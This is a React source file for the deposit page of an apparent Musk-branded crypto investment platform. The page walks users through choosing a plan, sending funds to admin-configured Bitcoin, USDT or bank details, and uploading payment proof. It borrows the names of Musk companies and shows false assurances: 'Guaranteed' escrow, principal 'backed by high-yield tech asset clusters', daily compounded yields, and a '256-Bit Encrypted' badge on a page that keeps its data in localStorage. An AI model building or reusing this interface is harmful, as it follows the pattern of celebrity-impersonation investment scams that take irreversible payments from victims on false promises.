import React, { useState, useEffect, useRef } from 'react';
import { motion } from 'motion/react';
import { 
  TrendingUp, Coins, ShieldCheck, ArrowRight, Check, Sparkles, 
  Wallet, Copy, Upload, CreditCard, ChevronRight, Calendar, 
  Clock, AlertTriangle, CheckCircle2, ArrowLeft, Info, HelpCircle
} from 'lucide-react';
import { InvestmentPlan, UserState } from '../types';
import { DepositTransaction } from './Plans';

interface DepositPageProps {
  user: UserState;
  initialSelectedPlan: InvestmentPlan | null;
  onBackToDashboard: () => void;
}

export default function DepositPage({ user, initialSelectedPlan, onBackToDashboard }: DepositPageProps) {
  const [plans, setPlans] = useState<InvestmentPlan[]>([]);
  const [selectedPlan, setSelectedPlan] = useState<InvestmentPlan | null>(initialSelectedPlan);
  const [paymentConfig, setPaymentConfig] = useState<any>({});
  const [qrConfig, setQrConfig] = useState<any>({});

  const [portalStep, setPortalStep] = useState<'details' | 'payment-method' | 'payment-details' | 'payment-proof' | 'success'>('details');
  const [chosenPaymentMethod, setChosenPaymentMethod] = useState<any>(null);
  const [screenshot, setScreenshot] = useState<string | null>(null);
  const [transactionId, setTransactionId] = useState('');
  const [additionalNotes, setAdditionalNotes] = useState('');
  const [copied, setCopied] = useState(false);
  const [generatedRefNo, setGeneratedRefNo] = useState('');
  const [fileDragging, setFileDragging] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Load plans, configurations, and state
  useEffect(() => {
    // Load plans
    const savedPlans = localStorage.getItem('musk_plans');
    if (savedPlans) {
      try {
        setPlans(JSON.parse(savedPlans));
        if (!selectedPlan && JSON.parse(savedPlans).length > 0) {
          setSelectedPlan(JSON.parse(savedPlans)[0]);
        }
      } catch (e) {
        setPlans(DEFAULT_PLANS);
        if (!selectedPlan) setSelectedPlan(DEFAULT_PLANS[0]);
      }
    } else {
      setPlans(DEFAULT_PLANS);
      localStorage.setItem('musk_plans', JSON.stringify(DEFAULT_PLANS));
      if (!selectedPlan) setSelectedPlan(DEFAULT_PLANS[0]);
    }

    // Load payment config
    const savedPaymentConfig = localStorage.getItem('musk_payment_config');
    if (savedPaymentConfig) {
      try {
        setPaymentConfig(JSON.parse(savedPaymentConfig));
      } catch (e) {}
    } else {
      const defaultPay = {
        bankName: 'Starbase Galactic Credit Union',
        accountName: 'Musk Investment Corp',
        accountNumber: '184-7392-1029',
        routingNumber: '021000021',
        btcAddress: '1MuSk77vXz8S8VPrAdAr8S73v48yPnC9E9',
        usdtTrcAddress: 'TX9MuSkTRC20PlAtForMe198473210vY9s',
        usdtErcAddress: '0x9a7bMuSkERC20F000de739D7Fbe41983021'
      };
      setPaymentConfig(defaultPay);
      localStorage.setItem('musk_payment_config', JSON.stringify(defaultPay));
    }

    // Load QR config
    const savedQrConfig = localStorage.getItem('musk_qr_config');
    if (savedQrConfig) {
      try {
        setQrConfig(JSON.parse(savedQrConfig));
      } catch (e) {}
    } else {
      const defaultQr = {
        btcQr: '',
        usdtTrcQr: '',
        usdtErcQr: '',
        bankQr: ''
      };
      setQrConfig(defaultQr);
      localStorage.setItem('musk_qr_config', JSON.stringify(defaultQr));
    }

    setGeneratedRefNo(`MSK-${Math.floor(10000 + Math.random() * 90000)}-DEP`);
  }, []);

  const DEFAULT_PLANS: InvestmentPlan[] = [
    {
      id: 'plan-1',
      name: 'Boring Venture Node',
      apr: 8.5,
      minDeposit: 1000,
      duration: 30,
      description: 'Entry-level commitment plan exploring tunneling and transit routing infrastructure yields.',
      badge: 'Starter',
    },
    {
      id: 'plan-2',
      name: 'Optimus Kinetic Core',
      apr: 10.0,
      minDeposit: 2000,
      duration: 45,
      description: 'Harness autonomous robotic fleet grid energy allocations for consistent daily compounded yields.',
      badge: 'Robot Tech',
    },
    {
      id: 'plan-3',
      name: 'Gigafactory Battery Power',
      apr: 12.5,
      minDeposit: 3000,
      duration: 60,
      description: 'Clean energy Gigapack storage networks backed by production dividends.',
      badge: 'Eco Yield',
    }
  ];

  const activeBtcAddress = paymentConfig.btcAddress || '1MuSk77vXz8S8VPrAdAr8S73v48yPnC9E9';
  const activeUsdtTrc = paymentConfig.usdtTrcAddress || 'TX9MuSkTRC20PlAtForMe198473210vY9s';
  const activeUsdtErc = paymentConfig.usdtErcAddress || '0x9a7bMuSkERC20F000de739D7Fbe41983021';
  const activeBankDetails = `Beneficiary: ${paymentConfig.accountName || 'Musk Investment Corp'}\nBank Name: ${paymentConfig.bankName || 'Starbase Galactic Credit Union'}\nAccount No: ${paymentConfig.accountNumber || '184-7392-1029'}\nRouting No: ${paymentConfig.routingNumber || '021000021'}`;

  const paymentMethods = [
    ...(paymentConfig.showBtc !== false ? [{
      id: 'btc',
      name: 'Bitcoin (BTC)',
      type: 'Crypto',
      address: activeBtcAddress,
      placeholder: 'Send exactly the BTC equivalent value to this secure wallet address.',
      icon: '₿',
      qr: qrConfig.btcQr
    }] : []),
    ...(paymentConfig.showTrc !== false ? [{
      id: 'usdt-trc20',
      name: 'USDT (TRC20)',
      type: 'Crypto',
      address: activeUsdtTrc,
      placeholder: 'Use the TRC20 / Tron Network when sending funds to prevent token loss.',
      icon: '₮',
      qr: qrConfig.usdtTrcQr
    }] : []),
    ...(paymentConfig.showErc !== false ? [{
      id: 'usdt-erc20',
      name: 'USDT (ERC20)',
      type: 'Crypto',
      address: activeUsdtErc,
      placeholder: 'Use the ERC20 / Ethereum Network when sending funds.',
      icon: '♦',
      qr: qrConfig.usdtErcQr
    }] : []),
    ...(paymentConfig.showBank !== false ? [{
      id: 'bank',
      name: 'Bank Wire / Transfer',
      type: 'Fiat',
      address: activeBankDetails,
      placeholder: 'Initiate a standard bank wire or ACH. Ensure you include the reference code in transfer description.',
      icon: '🏦',
      qr: qrConfig.bankQr
    }] : [])
  ];

  const handleCopyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }).catch(() => {
      const textArea = document.createElement('textarea');
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  const handleScreenshotChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      const reader = new FileReader();
      reader.onload = (event) => {
        if (event.target?.result) {
          setScreenshot(event.target.result as string);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setFileDragging(true);
  };

  const handleDragLeave = () => {
    setFileDragging(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setFileDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      const file = e.dataTransfer.files[0];
      const reader = new FileReader();
      reader.onload = (event) => {
        if (event.target?.result) {
          setScreenshot(event.target.result as string);
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handlePaymentSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedPlan || !chosenPaymentMethod) return;

    // Create deposit
    const newDeposit: DepositTransaction = {
      id: `dep-${Date.now()}`,
      planId: selectedPlan.id,
      planName: selectedPlan.name,
      amount: selectedPlan.minDeposit,
      paymentMethod: chosenPaymentMethod.name,
      date: new Date().toISOString().replace('T', ' ').substring(0, 16),
      status: 'Pending',
      referenceNo: generatedRefNo,
      transactionId: transactionId || undefined,
      notes: additionalNotes || undefined,
      screenshotUrl: screenshot || undefined,
    };

    // Retrieve active user's deposits and save
    const currentDepositsStr = localStorage.getItem('musk_deposits');
    let currentDeposits: DepositTransaction[] = [];
    if (currentDepositsStr) {
      try {
        currentDeposits = JSON.parse(currentDepositsStr);
      } catch (err) {}
    }

    // Attach user email for rigorous backend filtering
    const depositWithUser = {
      ...newDeposit,
      userEmail: user.email.toLowerCase()
    };

    const updatedDeposits = [depositWithUser, ...currentDeposits];
    localStorage.setItem('musk_deposits', JSON.stringify(updatedDeposits));

    // Send Real dynamic notification
    const notificationId = `notif-${Date.now()}`;
    const newNotification = {
      id: notificationId,
      userEmail: user.email.toLowerCase(),
      title: 'Deposit Under Verification',
      text: `Your deposit of $${selectedPlan.minDeposit.toLocaleString()} for the ${selectedPlan.name} is currently under administrative verification.`,
      date: new Date().toLocaleString(),
      isRead: false
    };

    const existingNotifsStr = localStorage.getItem('musk_notifications');
    let existingNotifs = [];
    if (existingNotifsStr) {
      try {
        existingNotifs = JSON.parse(existingNotifsStr);
      } catch (err) {}
    }
    localStorage.setItem('musk_notifications', JSON.stringify([newNotification, ...existingNotifs]));

    // Log dynamic activity audit
    const activityId = `act-${Date.now()}`;
    const newActivity = {
      id: activityId,
      userEmail: user.email.toLowerCase(),
      text: `Submitted deposit proof of $${selectedPlan.minDeposit.toLocaleString()} for ${selectedPlan.name}.`,
      date: new Date().toLocaleString(),
      type: 'Deposit'
    };

    const existingActsStr = localStorage.getItem('musk_activities');
    let existingActs = [];
    if (existingActsStr) {
      try {
        existingActs = JSON.parse(existingActsStr);
      } catch (err) {}
    }
    localStorage.setItem('musk_activities', JSON.stringify([newActivity, ...existingActs]));

    setPortalStep('success');
  };

  return (
    <div id="deposit-page-main" className="max-w-4xl mx-auto px-4 sm:px-6 py-6 text-left space-y-6">
      
      {/* Upper Navigation Header */}
      <div className="flex justify-between items-center border-b border-white/5 pb-4">
        <button
          onClick={onBackToDashboard}
          className="flex items-center gap-2 text-xs font-bold text-gray-400 hover:text-white transition-all bg-white/5 hover:bg-white/10 px-3.5 py-2 rounded-xl border border-white/5"
        >
          <ArrowLeft className="h-4 w-4" />
          <span>Cancel & Back</span>
        </button>
        
        <div className="text-right">
          <p className="text-[10px] font-mono font-bold uppercase text-purple-400">Security Gate</p>
          <p className="text-xs font-bold text-emerald-400 font-mono flex items-center gap-1 justify-end">
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-400 animate-pulse" /> 256-Bit Encrypted
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column: Progress or informational sidebar */}
        <div className="lg:col-span-4 space-y-4">
          <div className="rounded-2xl border border-purple-500/10 bg-[#06041c]/50 p-5 space-y-4">
            <h3 className="text-xs font-mono font-bold uppercase text-purple-400 tracking-wider">Verification Steps</h3>
            
            <div className="space-y-3 text-xs">
              <div className={`flex items-start gap-2.5 p-2 rounded-lg ${portalStep === 'details' ? 'bg-purple-500/10 border border-purple-500/20 text-white' : 'text-gray-400'}`}>
                <div className={`h-5 w-5 rounded-full flex items-center justify-center font-mono font-bold text-[10px] ${portalStep === 'details' ? 'bg-purple-500 text-black' : 'bg-white/5'}`}>1</div>
                <div>
                  <p className="font-bold">Plan Confirmation</p>
                  <p className="text-[10px] text-gray-500 mt-0.5">Select node scale and APR yields</p>
                </div>
              </div>

              <div className={`flex items-start gap-2.5 p-2 rounded-lg ${portalStep === 'payment-method' ? 'bg-purple-500/10 border border-purple-500/20 text-white' : 'text-gray-400'}`}>
                <div className={`h-5 w-5 rounded-full flex items-center justify-center font-mono font-bold text-[10px] ${portalStep === 'payment-method' ? 'bg-purple-500 text-black' : 'bg-white/5'}`}>2</div>
                <div>
                  <p className="font-bold">Select Channel</p>
                  <p className="text-[10px] text-gray-500 mt-0.5">Choose Crypto or Fiat transfer</p>
                </div>
              </div>

              <div className={`flex items-start gap-2.5 p-2 rounded-lg ${portalStep === 'payment-details' ? 'bg-purple-500/10 border border-purple-500/20 text-white' : 'text-gray-400'}`}>
                <div className={`h-5 w-5 rounded-full flex items-center justify-center font-mono font-bold text-[10px] ${portalStep === 'payment-details' ? 'bg-purple-500 text-black' : 'bg-white/5'}`}>3</div>
                <div>
                  <p className="font-bold">Transfer Specifications</p>
                  <p className="text-[10px] text-gray-500 mt-0.5">Scan address with QR support</p>
                </div>
              </div>

              <div className={`flex items-start gap-2.5 p-2 rounded-lg ${portalStep === 'payment-proof' ? 'bg-purple-500/10 border border-purple-500/20 text-white' : 'text-gray-400'}`}>
                <div className={`h-5 w-5 rounded-full flex items-center justify-center font-mono font-bold text-[10px] ${portalStep === 'payment-proof' ? 'bg-purple-500 text-black' : 'bg-white/5'}`}>4</div>
                <div>
                  <p className="font-bold">Validate Proof</p>
                  <p className="text-[10px] text-gray-500 mt-0.5">Submit screenshot or ID proof</p>
                </div>
              </div>
            </div>
          </div>

          <div className="rounded-2xl border border-white/5 bg-[#09071f]/30 p-4 space-y-2 text-xs">
            <h4 className="font-bold text-white flex items-center gap-1.5"><HelpCircle className="h-4 w-4 text-purple-400" /> Need Help?</h4>
            <p className="text-gray-400 leading-relaxed font-light">
              Node activations take between 5 to 30 minutes to complete verification. Make sure your uploaded screenshot displays your TxHash/Reference Code clearly.
            </p>
          </div>
        </div>

        {/* Right Column: Active Interactive Steps Container */}
        <div className="lg:col-span-8">
          <div className="rounded-2xl border border-white/5 bg-[#09071f]/50 p-6 sm:p-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 h-40 w-40 bg-purple-600/[0.02] blur-3xl pointer-events-none rounded-full" />
            
            {/* Step Content */}
            {portalStep === 'details' && selectedPlan && (
              <div className="space-y-6">
                <div className="space-y-1">
                  <p className="text-xs font-mono font-bold text-purple-400 uppercase tracking-widest">STEP 1: CONFIRMED NODE ALLOCATION</p>
                  <h3 className="text-xl sm:text-2xl font-black text-white">Investment Plan Specifications</h3>
                  <p className="text-xs text-gray-400 font-light">
                    Review and confirm your selected investment node before configuring payment routing.
                  </p>
                </div>

                {/* Plan Dropdown selector if user wants to change plans */}
                <div className="space-y-1.5">
                  <label className="text-xs font-mono text-gray-400 uppercase tracking-wider">Selected Staking Node</label>
                  <select
                    value={selectedPlan.id}
                    onChange={(e) => {
                      const p = plans.find(pl => pl.id === e.target.value);
                      if (p) setSelectedPlan(p);
                    }}
                    className="w-full rounded-xl border border-white/10 bg-black/40 px-4 py-3.5 text-xs font-bold text-white focus:border-purple-500/50 focus:outline-none focus:ring-1 focus:ring-purple-500/30 transition-all cursor-pointer"
                  >
                    {plans.map(p => (
                      <option key={p.id} value={p.id} className="bg-[#09071f] text-white">
                        {p.name} (${p.minDeposit.toLocaleString()} Minimum - {p.apr}% APR)
                      </option>
                    ))}
                  </select>
                </div>

                <div className="rounded-xl bg-[#090729]/80 border border-purple-500/10 p-5 space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-[10px] uppercase font-mono text-gray-500">Maturity Capital</p>
                      <p className="text-lg font-black text-emerald-400 font-mono mt-0.5">
                        ${selectedPlan.minDeposit.toLocaleString()}
                      </p>
                    </div>
                    <div>
                      <p className="text-[10px] uppercase font-mono text-gray-500">Node Speed (APR)</p>
                      <p className="text-lg font-black text-purple-300 font-mono mt-0.5">
                        {selectedPlan.apr}% Est
                      </p>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4 border-t border-white/5 pt-4">
                    <div>
                      <p className="text-[10px] uppercase font-mono text-gray-500">Node Term Limit</p>
                      <p className="text-sm font-bold text-white mt-0.5">
                        {selectedPlan.duration} Days Lock-in
                      </p>
                    </div>
                    <div>
                      <p className="text-[10px] uppercase font-mono text-gray-500">Escrow Security</p>
                      <p className="text-xs font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/25 px-2.5 py-1 rounded-lg inline-block mt-0.5">
                        Guaranteed
                      </p>
                    </div>
                  </div>
                </div>

                <div className="flex items-start gap-3 rounded-xl bg-purple-950/20 p-4 border border-purple-500/15 text-xs text-purple-300">
                  <Info className="h-5 w-5 shrink-0 text-purple-400" />
                  <p className="leading-relaxed font-light">
                    Your principal is backed by high-yield tech asset clusters. Composed yields are dynamically disbursed into your available balance daily.
                  </p>
                </div>

                <button
                  onClick={() => setPortalStep('payment-method')}
                  className="w-full flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 py-4 text-xs font-bold text-white shadow-xl shadow-purple-500/20 active:scale-[0.98] transition-all min-h-[48px]"
                >
                  <span>Select Payment Channel</span>
                  <ArrowRight className="h-4 w-4" />
                </button>
              </div>
            )}

            {portalStep === 'payment-method' && (
              <div className="space-y-6">
                <div className="space-y-1">
                  <p className="text-xs font-mono font-bold text-purple-400 uppercase tracking-widest">STEP 2: PAYMENT METHOD Selection</p>
                  <h3 className="text-xl sm:text-2xl font-black text-white">Choose Ingress Channel</h3>
                  <p className="text-xs text-gray-400 font-light">
                    Select the ledger channel you want to transfer funds through.
                  </p>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                  {paymentMethods.map((method) => {
                    const isSelected = chosenPaymentMethod?.id === method.id;
                    return (
                      <button
                        key={method.id}
                        onClick={() => setChosenPaymentMethod(method)}
                        className={`flex items-center gap-4 p-4 rounded-xl border text-left transition-all ${
                          isSelected 
                            ? 'border-purple-500 bg-purple-500/10'
                            : 'border-white/5 bg-white/[0.02] hover:border-white/10'
                        } min-h-[72px]`}
                      >
                        <div className="h-11 w-11 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center text-xl font-bold text-purple-400 shrink-0">
                          {method.icon}
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-bold text-white truncate">{method.name}</p>
                          <p className="text-[10px] text-gray-400">{method.type} Transfer Node</p>
                        </div>
                        <ChevronRight className={`h-4 w-4 text-gray-500 shrink-0 transition-transform ${isSelected ? 'translate-x-1 text-purple-400' : ''}`} />
                      </button>
                    );
                  })}
                </div>

                <div className="flex flex-col sm:flex-row gap-3 pt-4 border-t border-white/5">
                  <button
                    onClick={() => setPortalStep('details')}
                    className="w-full sm:w-1/3 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 py-3.5 text-xs font-semibold text-white transition-all min-h-[44px]"
                  >
                    Back
                  </button>
                  <button
                    disabled={!chosenPaymentMethod}
                    onClick={() => setPortalStep('payment-details')}
                    className="w-full sm:flex-1 flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 py-3.5 text-xs font-bold text-white shadow-lg disabled:opacity-40 transition-all min-h-[44px]"
                  >
                    <span>Continue to Transfer Specifications</span>
                    <ArrowRight className="h-4 w-4" />
                  </button>
                </div>
              </div>
            )}

            {portalStep === 'payment-details' && chosenPaymentMethod && selectedPlan && (
              <div className="space-y-6">
                <div className="space-y-1">
                  <p className="text-xs font-mono font-bold text-purple-400 uppercase tracking-widest">STEP 3: TRANSFER SPECIFICATIONS</p>
                  <h3 className="text-xl sm:text-2xl font-black text-white">Payment Gateway Details</h3>
                  <p className="text-xs text-gray-400 font-light">
                    Send the exact capital amount to the admin-configured addresses/details below.
                  </p>
                </div>

                <div className="rounded-xl bg-[#090729]/80 border border-purple-500/10 p-5 space-y-4">
                  <div className="flex justify-between items-center pb-3 border-b border-white/5">
                    <span className="text-xs text-gray-400">Total Required Capital</span>
                    <span className="text-base font-black text-white font-mono">${selectedPlan.minDeposit.toLocaleString()}</span>
                  </div>

                  {/* Render Admin-configured QR Code */}
                  <div className="flex flex-col items-center justify-center p-3 bg-black/40 rounded-xl border border-white/5 space-y-2">
                    <span className="text-[10px] font-mono font-bold uppercase text-purple-400 tracking-wider">Recipient QR Code Scan</span>
                    <div className="h-32 w-32 bg-white p-2 rounded-xl flex items-center justify-center shadow-lg">
                      {chosenPaymentMethod.qr ? (
                        <img 
                          src={chosenPaymentMethod.qr} 
                          alt={`${chosenPaymentMethod.name} QR Code`} 
                          className="h-full w-full object-contain" 
                        />
                      ) : (
                        <img 
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&color=040212&data=${encodeURIComponent(chosenPaymentMethod.address.replace('[Refer to your Reference No]', generatedRefNo))}`}
                          alt={`${chosenPaymentMethod.name} Auto QR Code`} 
                          className="h-full w-full object-contain" 
                          referrerPolicy="no-referrer"
                        />
                      )}
                    </div>
                    <p className="text-[9px] text-gray-500 italic">Scan with your cryptographic wallet or bank terminal</p>
                  </div>

                  {/* Address Display Block */}
                  <div className="space-y-2 text-xs">
                    <span className="text-gray-400 block font-semibold uppercase tracking-wider text-[10px]">
                      {chosenPaymentMethod.type === 'Crypto' ? 'Official Wallet Destination' : 'Official Receiving Bank Account Details'}
                    </span>
                    <div className="relative">
                      <div className="w-full bg-black/40 border border-white/10 rounded-xl p-3.5 pr-12 font-mono text-gray-300 break-all leading-relaxed whitespace-pre-wrap min-h-[44px]">
                        {chosenPaymentMethod.address.replace('[Refer to your Reference No]', generatedRefNo)}
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopyToClipboard(chosenPaymentMethod.address.replace('[Refer to your Reference No]', generatedRefNo))}
                        className="absolute right-2 top-2 p-2 rounded-lg bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white transition-all min-h-[36px]"
                        title="Copy details"
                      >
                        <Copy className="h-4 w-4" />
                      </button>
                    </div>

                    {copied && (
                      <span className="text-[10px] font-bold text-emerald-400 block text-right">
                        Successfully copied to clipboard!
                      </span>
                    )}
                  </div>

                  <div className="flex justify-between items-center pt-3 border-t border-white/5">
                    <span className="text-xs text-gray-400">Node Reference Code</span>
                    <span className="text-xs font-bold font-mono text-purple-400 bg-purple-500/10 border border-purple-500/20 px-2.5 py-1 rounded-lg">
                      {generatedRefNo}
                    </span>
                  </div>
                </div>

                <p className="text-xs text-amber-300/80 leading-relaxed font-light flex items-start gap-1.5 bg-amber-500/[0.03] border border-amber-500/10 p-3 rounded-xl">
                  <AlertTriangle className="h-4.5 w-4.5 text-amber-400 shrink-0 mt-0.5" />
                  <span>{chosenPaymentMethod.placeholder} Make sure to capture a snapshot of the transaction completion panel.</span>
                </p>

                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                  <button
                    onClick={() => setPortalStep('payment-method')}
                    className="w-full sm:w-1/3 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 py-3.5 text-xs font-semibold text-white transition-all min-h-[44px]"
                  >
                    Back
                  </button>
                  <button
                    onClick={() => setPortalStep('payment-proof')}
                    className="w-full sm:flex-1 flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 py-3.5 text-xs font-semibold text-white shadow-lg transition-all min-h-[44px]"
                  >
                    <span>I Have Transferred Funds</span>
                    <ArrowRight className="h-4 w-4" />
                  </button>
                </div>
              </div>
            )}

            {portalStep === 'payment-proof' && chosenPaymentMethod && selectedPlan && (
              <form onSubmit={handlePaymentSubmit} className="space-y-6">
                <div className="space-y-1">
                  <p className="text-xs font-mono font-bold text-purple-400 uppercase tracking-widest">STEP 4: SUBMIT VERIFICATION PROOF</p>
                  <h3 className="text-xl sm:text-2xl font-black text-white">Upload Deposit Proof</h3>
                  <p className="text-xs text-gray-400 font-light">
                    Upload your receipt screenshot or wire record below to verify this node deployment.
                  </p>
                </div>

                {/* Screenshot File upload interface (drag and drop + click input) */}
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold uppercase tracking-wider text-purple-200/70 block">Proof Receipt Image</label>
                  
                  <div
                    onDragOver={handleDragOver}
                    onDragLeave={handleDragLeave}
                    onDrop={handleDrop}
                    onClick={() => fileInputRef.current?.click()}
                    className={`border-2 border-dashed rounded-xl p-8 text-center cursor-pointer transition-all flex flex-col items-center justify-center gap-4 ${
                      fileDragging 
                        ? 'border-purple-400 bg-purple-500/10' 
                        : screenshot 
                          ? 'border-purple-500/40 bg-purple-500/5' 
                          : 'border-white/10 bg-white/[0.01] hover:border-white/20'
                    }`}
                  >
                    <input
                      type="file"
                      accept="image/*"
                      ref={fileInputRef}
                      onChange={handleScreenshotChange}
                      className="hidden"
                      required={!screenshot}
                    />

                    {screenshot ? (
                      <div className="space-y-3">
                        <img
                          src={screenshot}
                          alt="Payment screenshot preview"
                          className="max-h-36 mx-auto rounded-lg border border-white/10 object-contain shadow-md"
                        />
                        <p className="text-xs text-emerald-400 font-bold flex items-center justify-center gap-1">
                          <Check className="h-4 w-4" /> Receipt screenshot successfully enqueued
                        </p>
                        <span className="text-[11px] text-gray-500 underline hover:text-white block">Replace Receipt Image</span>
                      </div>
                    ) : (
                      <>
                        <div className="h-12 w-12 rounded-full bg-white/5 border border-white/10 flex items-center justify-center text-gray-400">
                          <Upload className="h-6 w-6" />
                        </div>
                        <div>
                          <p className="text-xs font-semibold text-white">Click to upload or drag image file here</p>
                          <p className="text-[10px] text-gray-500 mt-1">Supports PNG, JPG, JPEG formats up to 10MB</p>
                        </div>
                      </>
                    )}
                  </div>
                </div>

                {/* Transaction ID input */}
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold uppercase tracking-wider text-purple-200/70 block">Transaction Hash / Wire Reference ID</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. TXN-8194-BTC-MSK or bank reference"
                    value={transactionId}
                    onChange={(e) => setTransactionId(e.target.value)}
                    className="w-full rounded-xl border border-white/10 bg-black/40 px-4 py-3.5 text-xs text-white placeholder-gray-500 focus:border-purple-500/50 focus:outline-none focus:ring-1 focus:ring-purple-500/30 transition-all min-h-[44px]"
                  />
                </div>

                {/* Additional Notes input */}
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold uppercase tracking-wider text-purple-200/70 block">Optional Message / Specifications</label>
                  <textarea
                    placeholder="Input any comments, wire sender names, or specific requests for the administrators."
                    rows={2}
                    value={additionalNotes}
                    onChange={(e) => setAdditionalNotes(e.target.value)}
                    className="w-full rounded-xl border border-white/10 bg-black/40 px-4 py-3 text-xs text-white placeholder-gray-500 focus:border-purple-500/50 focus:outline-none focus:ring-1 focus:ring-purple-500/30 transition-all leading-relaxed"
                  />
                </div>

                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => setPortalStep('payment-details')}
                    className="w-full sm:w-1/3 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 py-3.5 text-xs font-semibold text-white transition-all min-h-[44px]"
                  >
                    Back
                  </button>
                  <button
                    type="submit"
                    disabled={!screenshot || !transactionId}
                    className="w-full sm:flex-1 flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 py-3.5 text-xs font-bold text-white shadow-lg disabled:opacity-50 transition-all min-h-[44px]"
                  >
                    <span>Submit Node Verification</span>
                    <ArrowRight className="h-4 w-4" />
                  </button>
                </div>
              </form>
            )}

            {portalStep === 'success' && selectedPlan && chosenPaymentMethod && (
              <div className="text-center space-y-6 py-6">
                <div className="inline-flex rounded-full bg-emerald-500/10 p-4 border border-emerald-500/20 shadow-lg shadow-emerald-500/5">
                  <CheckCircle2 className="h-12 w-12 text-emerald-400" />
                </div>

                <div className="space-y-2">
                  <span className="text-[10px] font-mono font-bold uppercase tracking-widest text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-0.5 rounded-full inline-block">Active Dispatch Initiated</span>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
                    Deposit Submitted Successfully
                  </h3>
                  <p className="text-xs sm:text-sm text-gray-400 font-light leading-relaxed max-w-sm mx-auto">
                    Your wire payment proof and node request has been locked. The transaction is currently being audited. Reference ID: <strong className="text-purple-300 font-mono font-bold">{generatedRefNo}</strong>.
                  </p>
                </div>

                <div className="max-w-md mx-auto rounded-xl bg-[#090729]/50 border border-white/5 p-4 text-left space-y-2.5 text-xs">
                  <div className="flex justify-between items-center text-gray-500">
                    <span>Staking Node Plan</span>
                    <span className="font-bold text-gray-300">{selectedPlan.name}</span>
                  </div>
                  <div className="flex justify-between items-center text-gray-500">
                    <span>Committed Balance</span>
                    <span className="font-bold font-mono text-emerald-400">${selectedPlan.minDeposit.toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between items-center text-gray-500">
                    <span>Payment Ledger</span>
                    <span className="font-bold text-gray-300">{chosenPaymentMethod.name}</span>
                  </div>
                  <div className="flex justify-between items-center text-gray-500">
                    <span>Verification Status</span>
                    <span className="font-mono text-amber-400 font-bold uppercase">PENDING REVIEW</span>
                  </div>
                </div>

                <div className="pt-6">
                  <button
                    onClick={onBackToDashboard}
                    className="w-full flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 py-4 text-xs font-bold text-white shadow-lg transition-all min-h-[48px]"
                  >
                    <span>Return To User Dashboard</span>
                    <ArrowRight className="h-4 w-4" />
                  </button>
                </div>
              </div>
            )}

          </div>
        </div>

      </div>

    </div>
  );
}
